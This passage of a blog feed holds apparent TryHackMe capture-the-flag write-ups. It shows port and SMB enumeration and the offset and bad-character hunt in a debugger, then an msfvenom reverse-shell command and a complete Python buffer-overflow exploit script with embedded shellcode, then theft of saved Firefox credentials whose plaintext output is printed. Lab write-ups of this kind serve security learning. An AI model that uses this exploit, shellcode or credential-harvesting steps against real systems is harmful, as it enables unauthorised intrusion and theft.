+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap 10.10.211.241
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-01-03 08:03 EST
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.211.241
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.058s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">989&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>conn-refused&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">135/tcp open msrpc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open microsoft-ds
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3389/tcp open ms-wbt-server
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">31337/tcp open Elite
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49152/tcp open unknown
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49153/tcp open unknown
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49154/tcp open unknown
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49155/tcp open unknown
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49161/tcp open unknown
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49167/tcp open unknown
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>First of all I am going to enumerate SAMBA&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">smbclient -L 10.10.211.241
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Sharename Type Comment
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --------- ---- -------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ADMIN$ Disk Remote Admin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> C$ Disk Default share
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> IPC$ IPC Remote IPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Users Disk
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">smbclient //10.10.211.241/Users
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">smb: &lt;span class="se">\&amp;gt;&lt;/span> ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> . DR &lt;span class="m">0&lt;/span> Thu May &lt;span class="m">14&lt;/span> 21:57:08 &lt;span class="m">2020&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> .. DR &lt;span class="m">0&lt;/span> Thu May &lt;span class="m">14&lt;/span> 21:57:08 &lt;span class="m">2020&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Default DHR &lt;span class="m">0&lt;/span> Tue Jul &lt;span class="m">14&lt;/span> 03:07:31 &lt;span class="m">2009&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> desktop.ini AHS &lt;span class="m">174&lt;/span> Tue Jul &lt;span class="m">14&lt;/span> 00:54:24 &lt;span class="m">2009&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Share D &lt;span class="m">0&lt;/span> Thu May &lt;span class="m">14&lt;/span> 21:58:07 &lt;span class="m">2020&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">7863807&lt;/span> blocks of size 4096. &lt;span class="m">3876514&lt;/span> blocks available
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>In the share directory I have found an exe file, which I am going to transfer in my windows machine.&lt;/p>
+&lt;p>I setted up my windows machine with Immunity Debugger+ mona.py, and I wrote a script to gain inital access.&lt;/p>
+&lt;p>I found the offset by writing in the prompt the output of this command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l &lt;span class="m">700&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Then after the crash I wrote in the immunity prompt&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">!mona findmsp -distance &lt;span class="m">700&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The results will give you the offset.&lt;/p>
+&lt;p>I found out the bad chars and jump point with mona too.&lt;/p>
+&lt;p>msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b &amp;ldquo;&lt;badchars>&amp;rdquo; -f c&lt;/p>
+&lt;p>I then added some NOPs and wrote this python script:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">import socket
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">ip&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;10.10.98.109&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">port&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">31337&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">146&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">overflow&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span> * offset
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">retn&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;\xc3\x14\x04\x08&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">padding&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;\x90&amp;#34;&lt;/span> * &lt;span class="m">16&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;\xdb\xd4\xbb\xde\xb4\xa5\xcc\xd9\x74\x24\xf4\x58\x29\xc9&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xb1\x52\x31\x58\x17\x03\x58\x17\x83\x1e\xb0\x47\x39\x62&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x51\x05\xc2\x9a\xa2\x6a\x4a\x7f\x93\xaa\x28\xf4\x84\x1a&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x3a\x58\x29\xd0\x6e\x48\xba\x94\xa6\x7f\x0b\x12\x91\x4e&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x8c\x0f\xe1\xd1\x0e\x52\x36\x31\x2e\x9d\x4b\x30\x77\xc0&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xa6\x60\x20\x8e\x15\x94\x45\xda\xa5\x1f\x15\xca\xad\xfc&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xee\xed\x9c\x53\x64\xb4\x3e\x52\xa9\xcc\x76\x4c\xae\xe9&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xc1\xe7\x04\x85\xd3\x21\x55\x66\x7f\x0c\x59\x95\x81\x49&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x5e\x46\xf4\xa3\x9c\xfb\x0f\x70\xde\x27\x85\x62\x78\xa3&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x3d\x4e\x78\x60\xdb\x05\x76\xcd\xaf\x41\x9b\xd0\x7c\xfa&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xa7\x59\x83\x2c\x2e\x19\xa0\xe8\x6a\xf9\xc9\xa9\xd6\xac&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xf6\xa9\xb8\x11\x53\xa2\x55\x45\xee\xe9\x31\xaa\xc3\x11&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xc2\xa4\x54\x62\xf0\x6b\xcf\xec\xb8\xe4\xc9\xeb\xbf\xde&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xae\x63\x3e\xe1\xce\xaa\x85\xb5\x9e\xc4\x2c\xb6\x74\x14&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xd0\x63\xda\x44\x7e\xdc\x9b\x34\x3e\x8c\x73\x5e\xb1\xf3&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x64\x61\x1b\x9c\x0f\x98\xcc\xa9\xdd\xb6\x78\xc6\xe3\xb6&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x91\x4a\x6d\x50\xfb\x62\x3b\xcb\x94\x1b\x66\x87\x05\xe3&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xbc\xe2\x06\x6f\x33\x13\xc8\x98\x3e\x07\xbd\x68\x75\x75&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x68\x76\xa3\x11\xf6\xe5\x28\xe1\x71\x16\xe7\xb6\xd6\xe8&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xfe\x52\xcb\x53\xa9\x40\x16\x05\x92\xc0\xcd\xf6\x1d\xc9&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x80\x43\x3a\xd9\x5c\x4b\x06\x8d\x30\x1a\xd0\x7b\xf7\xf4&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x92\xd5\xa1\xab\x7c\xb1\x34\x80\xbe\xc7\x38\xcd\x48\x27&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x88\xb8\x0c\x58\x25\x2d\x99\x21\x5b\xcd\x66\xf8\xdf\xed&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\x84\x28\x2a\x86\x10\xb9\x97\xcb\xa2\x14\xdb\xf5\x20\x9c&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xa4\x01\x38\xd5\xa1\x4e\xfe\x06\xd8\xdf\x6b\x28\x4f\xdf&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;\xb9&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">postfix&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">buffer&lt;/span> &lt;span class="o">=&lt;/span> overflow + retn + padding + payload + postfix
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">s&lt;/span> &lt;span class="o">=&lt;/span> socket.socket&lt;span class="o">(&lt;/span>socket.AF_INET, socket.SOCK_STREAM&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">try:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> s.connect&lt;span class="o">((&lt;/span>ip, port&lt;span class="o">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> s.send&lt;span class="o">(&lt;/span>bytes&lt;span class="o">(&lt;/span>buffer + &lt;span class="s2">&amp;#34;\r\n&amp;#34;&lt;/span>, &lt;span class="s2">&amp;#34;latin-1&amp;#34;&lt;/span>&lt;span class="o">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> print&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;Done!&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>After gaining initial access and wondering around a bit I noticed that the only possible thing to do would be getting credentials from Firefox, I used the metasploit tool &lt;code>post/multi/gather/firefox_creds&lt;/code>&lt;/p>
+&lt;p>After that I ran firefox_decrypt and got the username and password:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 firefox_decrypt.py firefox/loot
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2024-01-03 10:00:37,134 - WARNING - profile.ini not found in firefox/loot
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2024-01-03 10:00:37,134 - WARNING - Continuing and assuming &lt;span class="s1">&amp;#39;firefox/loot&amp;#39;&lt;/span> is a profile location
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Website: https://creds.com
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Username: &lt;span class="s1">&amp;#39;mayor&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password: &lt;span class="s1">&amp;#39;8CL7O1N78MdrCIsV&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item><item><title>Relevant Writeup THM</title><link>https://simonefelici.github.io/p/relevant-writeup-thm/</link><pubDate>Mon, 01 Jan 2024 13:00:00 +0100</pubDate><guid>https://simonefelici.github.io/p/relevant-writeup-thm/</guid><description>&lt;img src="https://images.unsplash.com/photo-1598662779094-110c2bad80b5?q=80&amp;w=2146&amp;auto=format&amp;fit=crop&amp;ixlib=rb-4.0.3&amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D" alt="Featured image of post Relevant Writeup THM" />&lt;p>The first thing that I have done, using nmap:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap 10.10.91.208
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2023-12-31 06:18 EST
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.91.208
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.076s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">995&lt;/span> filtered tcp ports &lt;span class="o">(&lt;/span>no-response&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">135/tcp open msrpc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open microsoft-ds
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3389/tcp open ms-wbt-server
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 11.68 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>80: Web page&lt;/li>
+&lt;li>135: msrpc&lt;/li>
+&lt;li>139: NetBios&lt;/li>
+&lt;li>445: Samba&lt;/li>
+&lt;li>3389: rdp&lt;/li>
+&lt;/ul>
+&lt;p>From there I can see that the machine is running windows.&lt;/p>
+&lt;p>The interessing ports are 80 and 445.&lt;/p>
+&lt;p>First of all I am just going to explolre the web page.&lt;/p>
+&lt;p>From the web page we can see that it uses IIS as a web server, which can be really helpfull, but for now I am going to search other things, like, samba enumeration:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -p &lt;span class="m">445&lt;/span> --script&lt;span class="o">=&lt;/span>smb-enum-shares.nse,smb-enum-users.nse 10.10.91.208
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2023-12-31 06:28 EST
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.91.208
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.067s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open microsoft-ds
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host script results:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> smb-enum-shares:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> account_used: guest
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="se">\\&lt;/span>10.10.91.208&lt;span class="se">\A&lt;/span>DMIN$:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Type: STYPE_DISKTREE_HIDDEN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Comment: Remote Admin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Anonymous access: &amp;lt;none&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Current user access: &amp;lt;none&amp;gt;
